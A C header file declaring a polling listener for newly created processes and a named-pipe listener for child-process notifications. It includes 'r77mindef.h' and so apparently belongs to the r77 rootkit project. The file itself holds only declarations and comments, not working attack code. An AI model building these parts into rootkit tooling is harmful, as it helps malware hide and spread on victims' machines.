#include "r77mindef.h"
#ifndef _PROCESSLISTENER_H
#define _PROCESSLISTENER_H

/// <summary>
/// A callback that notifies about a process ID.
/// </summary>
typedef VOID(*PROCESSIDCALLBACK)(DWORD processId);

/// <summary>
/// Defines a listener, that checks for new processes in a given interval.
/// </summary>
typedef struct _NEW_PROCESS_LISTENER
{
	/// <summary>
	/// The interval, in milliseconds, between each enumeration of running processes.
	/// </summary>
	DWORD Interval;
	/// <summary>
	/// The function that is called, when a process is found that was not present in the previous enumeration.
	/// </summary>
	PROCESSIDCALLBACK Callback;
} NEW_PROCESS_LISTENER, *PNEW_PROCESS_LISTENER;

/// <summary>
/// Creates a new process listener, that checks for new processes in a given interval.
/// </summary>
/// <param name="interval">The interval, in milliseconds, between each enumeration of running processes.</param>
/// <param name="callback">The function that is called, when a process is found that was not present in the previous enumeration.</param>
VOID NewProcessListener(DWORD interval, PROCESSIDCALLBACK callback);
static DWORD WINAPI NewProcessListenerThread(LPVOID parameter);

/// <summary>
/// Creates a named pipe that listens for notifications about created child processes.
/// </summary>
/// <param name="callback">The function that is called, when the named pipe received a process ID.</param>
VOID ChildProcessListener(PROCESSIDCALLBACK callback);
static DWORD WINAPI ChildProcessListenerThread(LPVOID parameter);

#endif